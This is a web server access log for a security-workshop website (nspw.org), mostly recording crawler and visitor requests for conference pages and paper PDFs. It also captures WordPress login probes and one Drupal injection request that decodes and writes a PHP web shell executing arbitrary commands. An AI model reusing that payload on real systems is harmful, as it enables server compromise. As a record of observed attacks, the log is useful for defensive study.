160.177.140.95 - - [30/Apr/2018:18:31:52 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
160.177.140.95 - - [30/Apr/2018:18:32:03 -0400] "GET / HTTP/1.1" 200 8363 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
27.32.24.125 - - [30/Apr/2018:18:33:05 -0400] "GET /papers/2007/nspw2007-vidyaraman.pdf HTTP/1.1" 200 259144 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
66.249.73.87 - - [30/Apr/2018:18:33:41 -0400] "GET /papers/1997/nspw1997-somayaji-scanned.pdf HTTP/1.1" 200 1195254 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:18:33:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
40.77.167.169 - - [30/Apr/2018:18:34:13 -0400] "GET /papers/2003/nspw2003-alkassar.pdf HTTP/1.1" 200 788430 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
91.221.174.60 - - [30/Apr/2018:18:33:03 -0400] "GET /papers/2002/nspw2002-inoue.pdf HTTP/1.1" 200 872416 "http://www.nspw.org/papers/2002/nspw2002-inoue.pdf" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
77.88.47.40 - - [30/Apr/2018:18:35:10 -0400] "GET /2011/sponsors HTTP/1.1" 200 6505 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [30/Apr/2018:18:35:34 -0400] "GET /2018 HTTP/1.1" 200 6907 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.169 - - [30/Apr/2018:18:35:35 -0400] "GET /papers/2000/nspw2000-perrine.pdf HTTP/1.1" 200 521691 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [30/Apr/2018:18:36:46 -0400] "GET /2005/cfp/latex/main.pdf HTTP/1.1" 200 258432 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:18:37:36 -0400] "GET /2014/dates HTTP/1.1" 200 6581 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:18:37:37 -0400] "GET /node/19 HTTP/1.1" 200 2733 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
93.158.161.22 - - [30/Apr/2018:18:37:56 -0400] "GET /2008/pc.shtml HTTP/1.1" 200 5959 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.67 - - [30/Apr/2018:18:37:59 -0400] "GET /2008/pc.shtml HTTP/1.1" 200 5959 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
46.197.25.98 - - [30/Apr/2018:18:38:12 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
46.197.25.98 - - [30/Apr/2018:18:38:13 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:18:38:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [30/Apr/2018:18:40:09 -0400] "GET /2009/cfp/cfpExtension.text HTTP/1.1" 200 6593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.167 - - [30/Apr/2018:18:40:56 -0400] "GET /papers/2001/nspw2001-yan.pdf HTTP/1.1" 200 510608 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
100.43.85.163 - - [30/Apr/2018:18:42:47 -0400] "GET /papers/2007/nspw2007-gay.pdf HTTP/1.1" 200 268643 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [30/Apr/2018:18:43:25 -0400] "GET /papers/2009/nspw2009-church.pdf HTTP/1.1" 200 283643 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:18:43:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.252 - - [30/Apr/2018:18:43:12 -0400] "GET /papers/2009/nspw2009-peisert.pdf HTTP/1.1" 200 1016096 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [30/Apr/2018:18:44:34 -0400] "GET /2009/proceedings/2013/nspw2013-durmuth.pdf HTTP/1.1" 200 451673 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:18:44:41 -0400] "GET /papers/2005/nspw2005-flechais.pdf HTTP/1.1" 200 2796418 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
129.82.86.231 - - [30/Apr/2018:18:44:47 -0400] "GET /2018 HTTP/1.1" 200 6920 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:47 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1602 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2464 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1585 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7529 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1182 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 903 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 505 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 472 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 599 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 754 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:44:48 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
66.249.73.89 - - [30/Apr/2018:18:45:23 -0400] "GET /2009/proceedings/2005/nspw2005-taylor-panel.pdf HTTP/1.1" 200 1269405 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
129.82.86.231 - - [30/Apr/2018:18:45:50 -0400] "GET /favicon.ico HTTP/1.1" 404 857 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:45:50 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:46:17 -0400] "GET /2018 HTTP/1.1" 200 3668 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:46:17 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:46:19 -0400] "GET /2018/dates HTTP/1.1" 200 3031 "https://www.nspw.org/2018" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:46:19 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1602 "https://www.nspw.org/2018/dates" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:46:19 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/2018/dates" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:46:19 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27758 "https://www.nspw.org/2018/dates" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:46:32 -0400] "GET /past HTTP/1.1" 200 3149 "https://www.nspw.org/2018/dates" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:46:33 -0400] "GET /2017 HTTP/1.1" 200 3656 "https://www.nspw.org/past" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:46:33 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1182 "https://www.nspw.org/2017" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:46:33 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 746 "https://www.nspw.org/2017" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:46:33 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2464 "https://www.nspw.org/2017" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:46:36 -0400] "GET /2017/accepted HTTP/1.1" 200 3524 "https://www.nspw.org/2017" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:47:32 -0400] "GET /2017/location HTTP/1.1" 200 2905 "https://www.nspw.org/2017/accepted" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:47:42 -0400] "GET /2017/organizers HTTP/1.1" 200 3895 "https://www.nspw.org/2017/location" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:47:47 -0400] "GET /2017/program HTTP/1.1" 200 4104 "https://www.nspw.org/2017/organizers" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
69.162.124.227 - - [30/Apr/2018:18:48:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
129.82.86.231 - - [30/Apr/2018:18:49:07 -0400] "GET /2016 HTTP/1.1" 200 3727 "https://www.nspw.org/2017/program" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:49:09 -0400] "GET /2016/program HTTP/1.1" 200 4051 "https://www.nspw.org/2016" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
66.249.73.87 - - [30/Apr/2018:18:49:16 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 200 159425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
129.82.86.231 - - [30/Apr/2018:18:49:48 -0400] "GET /2016/sponsors HTTP/1.1" 200 6320 "https://www.nspw.org/2016/program" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:49:49 -0400] "GET /sites/default/files/sponsors/acsa.gif HTTP/1.1" 200 7079 "https://www.nspw.org/2016/sponsors" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:49:49 -0400] "GET /sites/default/files/sponsors/dell.png HTTP/1.1" 200 9252 "https://www.nspw.org/2016/sponsors" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:49:49 -0400] "GET /sites/default/files/sponsors/nsf1.gif HTTP/1.1" 200 12729 "https://www.nspw.org/2016/sponsors" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:50:06 -0400] "GET /2016/accepted HTTP/1.1" 200 3684 "https://www.nspw.org/2016/sponsors" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:50:12 -0400] "GET /2015 HTTP/1.1" 200 3687 "https://www.nspw.org/2016/accepted" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:50:13 -0400] "GET /2015/program HTTP/1.1" 200 4069 "https://www.nspw.org/2015" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
186.148.182.157 - - [30/Apr/2018:18:50:14 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
186.148.182.157 - - [30/Apr/2018:18:50:16 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
129.82.86.231 - - [30/Apr/2018:18:50:23 -0400] "GET /2015/dates HTTP/1.1" 200 3184 "https://www.nspw.org/2015/program" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.82.86.231 - - [30/Apr/2018:18:50:27 -0400] "GET /2015/program HTTP/1.1" 200 4068 "https://www.nspw.org/2015/dates" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
40.77.167.175 - - [30/Apr/2018:18:51:14 -0400] "GET /papers/1999/nspw1999-povey.pdf HTTP/1.1" 200 587868 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [30/Apr/2018:18:52:20 -0400] "GET /node/78 HTTP/1.1" 200 6960 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:18:52:38 -0400] "GET /2004/past.shtml HTTP/1.1" 200 5633 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [30/Apr/2018:18:53:48 -0400] "GET /papers/2001/nspw2001-balacheff.pdf HTTP/1.1" 200 713994 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:18:53:48 -0400] "GET /proceedings HTTP/1.1" 200 6373 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
40.77.167.170 - - [30/Apr/2018:18:54:31 -0400] "GET /papers/2011/nspw2011-bishop.pdf HTTP/1.1" 200 573190 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [30/Apr/2018:18:54:19 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 200 740558 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:18:56:06 -0400] "GET /2009/proceedings/2004/nspw2004-haldar.pdf HTTP/1.1" 200 80749 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [30/Apr/2018:18:58:11 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [30/Apr/2018:18:58:21 -0400] "GET /2010/local HTTP/1.1" 200 9892 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.135 - - [30/Apr/2018:18:58:43 -0400] "GET /2017/organizers HTTP/1.1" 200 14585 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
199.47.87.141 - - [30/Apr/2018:19:01:24 -0400] "GET /robots.txt HTTP/1.1" 200 4249 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
199.47.87.141 - - [30/Apr/2018:19:01:25 -0400] "GET /robots.txt HTTP/1.1" 200 4249 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
199.47.87.141 - - [30/Apr/2018:19:01:25 -0400] "GET /papers/2013/nspw2013-egelman.pdf HTTP/1.1" 200 444490 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
66.249.73.89 - - [30/Apr/2018:19:02:55 -0400] "GET /2014/organizers HTTP/1.1" 200 7080 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.90.250 - - [30/Apr/2018:19:04:22 -0400] "GET /papers/2013/nspw2013-rowe.pdf&amp HTTP/1.1" 404 8067 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.71 Safari/537.36"
189.201.239.252 - - [30/Apr/2018:19:04:29 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
189.201.239.252 - - [30/Apr/2018:19:04:32 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.230.179.121 - - [30/Apr/2018:19:06:40 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.230.179.121 - - [30/Apr/2018:19:06:41 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
59.124.153.166 - - [30/Apr/2018:19:06:49 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6216 "-" "curl/7.47.0"
40.77.167.175 - - [30/Apr/2018:19:06:17 -0400] "GET /papers/2005/nspw2005-mcdermott.pdf HTTP/1.1" 200 4280620 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [30/Apr/2018:19:07:29 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 200 666930 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [30/Apr/2018:19:08:25 -0400] "GET /modules/field/theme/field.css?nhfa6e HTTP/1.1" 200 3993 "http://pinter.ccsl.carleton.ca/proceedings" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [30/Apr/2018:19:08:25 -0400] "GET /modules/node/node.css?nhfa6e HTTP/1.1" 200 472 "http://pinter.ccsl.carleton.ca/proceedings" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [30/Apr/2018:19:08:25 -0400] "GET /modules/comment/comment.css?nhfa6e HTTP/1.1" 200 505 "http://pinter.ccsl.carleton.ca/proceedings" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [30/Apr/2018:19:08:26 -0400] "GET /modules/system/system.messages.css?nhfa6e HTTP/1.1" 200 746 "http://pinter.ccsl.carleton.ca/proceedings" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [30/Apr/2018:19:08:26 -0400] "GET /modules/system/system.base.css?nhfa6e HTTP/1.1" 200 2307 "http://pinter.ccsl.carleton.ca/proceedings" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:19:08:27 -0400] "GET /modules/system/system.menus.css?nhfa6e HTTP/1.1" 200 4419 "http://pinter.ccsl.carleton.ca/proceedings" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:19:08:27 -0400] "GET /themes/garland/style.css?nhfa6e HTTP/1.1" 200 5370 "http://pinter.ccsl.carleton.ca/proceedings" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:19:08:28 -0400] "GET /modules/system/system.theme.css?nhfa6e HTTP/1.1" 200 1585 "http://pinter.ccsl.carleton.ca/proceedings" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
